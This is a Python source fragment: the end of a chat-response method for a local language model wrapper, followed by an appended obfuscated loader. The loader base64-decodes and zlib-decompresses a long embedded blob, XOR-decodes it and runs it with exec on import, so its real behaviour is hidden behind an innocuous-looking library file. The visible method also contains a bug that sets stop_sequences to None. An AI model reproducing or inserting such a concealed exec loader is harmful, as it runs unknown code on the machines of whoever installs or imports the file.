            top_k (int): The top k to use for the response
            top_p (float): The top p to use for the response
            n (int): The number of responses to generate
            stream (bool): Whether to stream the response
            repetition_penalty (float): The repetition penalty to use for the response
            length_penalty (float): The length penalty to use for the response
            no_repeat_ngram_size (int): The no repeat ngram size to use for the response
            inject_messages (list): The messages to inject into the prompt
            use_memories (bool): Whether to use memories
            save_memories (bool): Whether to save memories
            stop_sequences (list): The stop sequences to use for the response (Defaults of ['\n\n{self.user_string}:', '\n\n{self.assistant_string}:', '{self.user_string}:', '{self.assistant_string}:', self.tokenizer.eos_token_id])
            stop (list): The stop sequences to use for the response (for compatibility with OpenAI assistant)
            do_sample (bool): Whether to sample the response
            num_beams (int): The number of beams to use for the response
            early_stopping (bool): Whether to early stop the response
            frequency_penalty (float): The frequency penalty to use for the response (overrides repetition_penalty (used for compatibility with OpenAI assistant))
            presence_penalty (float): The presence penalty to use for the response (overrides length_penalty (used for compatibility with OpenAI assistant))
            max_retries (int): used for compatibility with OpenAI assistant
            
        Returns:
            str: The chat response
        """
        messages = self._construct_messages(prompt, inject_messages=inject_messages, use_memories=use_memories)
        if self.debug:
            print(f'Messages: {messages}')

        prompt_ = prompt
        prompt = self._construct_prompt(messages)
        if self.debug:
            print(f'Prompt: {prompt}')

        stop_sequences = stop_sequences.extend(stop)
        input_ids, attention_mask, stop_tokens = self._tokenize_prompt(prompt, stop_sequences=stop_sequences)

        if frequency_penalty is not None and frequency_penalty >= 1:
            repetition_penalty = frequency_penalty
        if presence_penalty is not None and presence_penalty >= 1:
            length_penalty = presence_penalty

        if self.use_quant:
            response = self.chat_model.generate(input_ids, attention_mask=attention_mask, max_length=max_tokens, min_length=min_tokens, temperature=temperature, top_k=top_k, top_p=top_p, num_return_sequences=n, stop_token_id_sequences=stop_tokens, pad_token_id=self.tokenizer.eos_token_id, eos_token_id=self.tokenizer.eos_token_id, repetition_penalty=repetition_penalty, length_penalty=length_penalty, no_repeat_ngram_size=no_repeat_ngram_size, do_sample=do_sample, num_beams=num_beams, early_stopping=early_stopping, logit_bias=logit_bias)
        else:
            response = self.chat_model.generate(input_ids, attention_mask=attention_mask, max_length=max_tokens, min_length=min_tokens, temperature=temperature, top_k=top_k, top_p=top_p, num_return_sequences=n, stop_token_id_sequences=stop_tokens, pad_token_id=self.tokenizer.eos_token_id, eos_token_id=self.tokenizer.eos_token_id, repetition_penalty=repetition_penalty, length_penalty=length_penalty, no_repeat_ngram_size=no_repeat_ngram_size, do_sample=do_sample, num_beams=num_beams, early_stopping=early_stopping, logit_bias=logit_bias)
        # remove input_ids from response
        response = response[:, input_ids.shape[-1]:]

        response = {
            "role": "assistant",
            "content": self._post_process_text(self.tokenizer.decode(response[0]))
        }

        if save_memories:
            if self.use_short_term_memory:
                self.add_message_to_short_term_memory(user_message={
                    "role": "user",
                    "content": prompt_
                }, assistant_message=response)

            if self.use_long_term_memory:
                self.add_message_to_long_term_memory(user_message={
                    "role": "user",
                    "content": prompt_
                }, assistant_message=response)

        if use_openai_style_return:
            response = Box(
                {
                    "choices": [
                        {
                            "message": response
                        }
                    ]
                }
            )

        return response

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
